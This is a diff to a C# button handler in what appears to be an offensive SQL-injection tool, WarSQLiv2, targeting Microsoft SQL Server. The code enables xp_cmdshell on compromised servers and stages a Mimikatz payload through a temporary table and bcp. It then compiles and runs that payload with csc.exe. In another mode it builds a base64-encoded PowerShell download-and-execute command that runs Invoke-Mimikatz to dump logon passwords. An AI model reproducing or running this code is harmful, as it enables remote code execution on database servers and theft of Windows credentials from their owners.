@@ -91,121 +91,159 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
         }
         private void btnRun_Click(object sender, RoutedEventArgs e)
         {
-            if(rdLocal.IsChecked == true)
+            var isActivated = cmdControl.isActivated;
+            var isExecuted = cmdControl.isExecuted;
+            if (isActivated == false && isExecuted == false)
             {
-                var savedFileNAme = string.Empty;
-                var mimiBinary = File.ReadAllBytes(@"Scanner\Mimikatz\Invoke-Mimikatz.txt");
+                var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                 try
                 {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    Dispatcher.Invoke((Action)delegate
                     {
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        _postExploitation.CreateBinaryTable();
-                        txtStatus.AppendText(_postExploitation.ExploitResult);
-
-
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        _postExploitation.BinaryData = mimiBinary;
-                        _postExploitation.InsertBinaryData();
-                        txtStatus.AppendText(_postExploitation.ExploitResult);
+                        enableXpCmdShell.XpCmdShellStatus();
+                        txtStatus.AppendText(enableXpCmdShell.Result);
+                        var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
+                        var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
+                        if (contains == true)
+                        {
+                            isActivated = true;
+                            isExecuted = true;
+                        }
                     });
                 }
-                catch (Exception exp)
+                catch (Exception)
                 {
                     Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                     {
-                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
-                    });
-                }
-
-                try
-                {
-                    _postExploitation.ExploitCode = string.Empty;
-                    var rnd = new Random();
-                    var chr = "0123456789ABCDEFGHIJKLMNOPRSTUVWXYZ".ToCharArray();
-                    var randomFileName = string.Empty;
-                    for (int i = 0; i < 12; i++)
-                    {
-                        randomFileName += chr[rnd.Next(0, chr.Length - 1)].ToString();
-                    }
-                    var extension = "ps1";
-                    _postExploitation.ExploitCode += "DECLARE @cmd  VARCHAR(8000);";
-                    _postExploitation.ExploitCode += "SET @cmd = 'bcp.exe \"SELECT CAST(binaryTable AS VARCHAR(MAX)) FROM WarSQLiTemp\" queryout \"C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension + "\" -c -T';";
-                    _postExploitation.ExploitCode += "EXEC xp_cmdshell  @cmd;";
-
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
-                    {
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        _postExploitation.RunExploit();
-                        txtStatus.AppendText(_postExploitation.ExploitResult);
-                        txtStatus.AppendText("File Saved: C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension);
-                        savedFileNAme = "C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension;
-                    });
-                }
-                catch (Exception exp)
-                {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
-                    {
-                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
-                    });
-                }
-
-                try
-                {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
-                    {
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        _postExploitation.RemoveTempTable();
-                        txtStatus.AppendText(_postExploitation.ExploitResult);
-                    });
-                }
-                catch (Exception exp)
-                {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
-                    {
-                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
-                    });
-                }
-
-                try
-                {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
-                    {
-                        _postExploitation.ExploitCode = string.Empty;
-                        _postExploitation.ExploitCode += "EXEC xp_cmdshell 'powershell -File "+ savedFileNAme + "';";
-                        _postExploitation.RunExploit();
-                        txtStatus.AppendText(_postExploitation.ExploitResult);
-                    });
-                }
-                catch (Exception exp)
-                {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
-                    {
-                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        txtStatus.AppendText(enableXpCmdShell.CmdException);
                     });
                 }
             }
-            else
+            if (isExecuted == true && isActivated == true)
             {
-                try
+                if (rdLocal.IsChecked == true)
                 {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    var savedFileNAme = string.Empty;
+                    var mimiBinary = File.ReadAllBytes(@"Scanner\Mimikatz\1.txt");
+                    try
                     {
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        var sendMimiText = "IEX (New-Object Net.WebClient).DownloadString('" + txtUrl.Text + "'); Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonPasswords exit\"";
-                        var psBs64 = EncodeBase64.ConvertTextToBase64(sendMimiText);
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            _postExploitation.CreateBinaryTable();
+                            txtStatus.AppendText(_postExploitation.ExploitResult);
+
+
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            _postExploitation.BinaryData = mimiBinary;
+                            _postExploitation.InsertBinaryData();
+                            txtStatus.AppendText(_postExploitation.ExploitResult);
+                        });
+                    }
+                    catch (Exception exp)
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        });
+                    }
+
+                    try
+                    {
                         _postExploitation.ExploitCode = string.Empty;
-                        _postExploitation.ExploitCode += "EXEC xp_cmdshell '" + psBs64 +"';";
-                        _postExploitation.RunExploit();
-                        txtStatus.AppendText(_postExploitation.ExploitResult);
-                    });
-                }
-                catch (Exception exp)
-                {
-                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        var rnd = new Random();
+                        var chr = "0123456789ABCDEFGHIJKLMNOPRSTUVWXYZ".ToCharArray();
+                        var randomFileName = string.Empty;
+                        for (int i = 0; i < 12; i++)
+                        {
+                            randomFileName += chr[rnd.Next(0, chr.Length - 1)].ToString();
+                        }
+                        var extension = "txt";
+                        _postExploitation.ExploitCode += "DECLARE @cmd  VARCHAR(8000);";
+                        _postExploitation.ExploitCode += "SET @cmd = 'bcp.exe \"SELECT CAST(binaryTable AS VARCHAR(MAX)) FROM WarSQLiTemp\" queryout \"C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension + "\" -c -T';";
+                        _postExploitation.ExploitCode += "EXEC xp_cmdshell  @cmd;";
+
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            _postExploitation.RunExploit();
+                            txtStatus.AppendText(_postExploitation.ExploitResult);
+                            txtStatus.AppendText("File Saved: C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension);
+                            savedFileNAme = "C:\\Users\\MSSQLSERVER\\" + randomFileName + "." + extension;
+                        });
+                    }
+                    catch (Exception exp)
                     {
-                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
-                    });
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        });
+                    }
+
+                    try
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            _postExploitation.RemoveTempTable();
+                            txtStatus.AppendText(_postExploitation.ExploitResult);
+                        });
+                    }
+                    catch (Exception exp)
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        });
+                    }
+
+                    try
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.ExploitCode = string.Empty;
+                            _postExploitation.ExploitCode += "EXEC xp_cmdshell 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\MSSQLSERVER\\eyup.exe " + savedFileNAme + "';";
+                            _postExploitation.RunExploit();
+                            txtStatus.AppendText(_postExploitation.ExploitResult);
+                        });
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.ExploitCode = string.Empty;
+                            _postExploitation.ExploitCode += "EXEC xp_cmdshell 'cmd.exe /c C:\\Users\\MSSQLSERVER\\eyup.exe';";
+                            _postExploitation.RunExploit();
+                            txtStatus.AppendText(_postExploitation.ExploitResult);
+                        });
+                    }
+                    catch (Exception exp)
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        });
+                    }
+                }
+                else
+                {
+                    try
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            var sendMimiText = "IEX (New-Object Net.WebClient).DownloadString('" + txtUrl.Text + "'); Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonPasswords exit\"";
+                            var psBs64 = EncodeBase64.ConvertTextToBase64(sendMimiText);
+                            _postExploitation.ExploitCode = string.Empty;
+                            _postExploitation.ExploitCode += "EXEC xp_cmdshell '" + psBs64 + "';";
+                            _postExploitation.RunExploit();
+                            txtStatus.AppendText(_postExploitation.ExploitResult);
+                        });
+                    }
+                    catch (Exception exp)
+                    {
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        });
+                    }
                 }
             }
         }
